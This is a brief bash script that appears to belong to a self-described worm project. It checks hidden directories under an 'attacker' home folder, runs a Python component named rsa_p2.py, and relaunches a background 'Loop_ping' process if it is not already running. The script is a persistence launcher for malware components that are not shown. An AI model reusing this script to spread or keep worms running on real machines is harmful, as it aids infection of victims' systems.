#!/bin/bash

en1_path="/home/attacker/Desktop/.Backup"
en2_path="/home/attacker/Public/.Simple_Worm/Loop"




if [ -d $en1_path ] 
then
    echo "Directory path1 exists." 
else 
	if [ -d $en2_path ] 
	then
	    echo "Directory path2 exists." 
    	python3 $en2_path/rsa_p2.py
		if pgrep Loop_ping > /dev/null
		then
		    echo "Yes Loop now. p2"  >> $en2_path/test
		else 
		    echo "No Loop new. p2" >> $en2_path/test
	    	$en2_path/Loop_ping &
		fi
	else 
	    echo "None path exists."
	fi
fi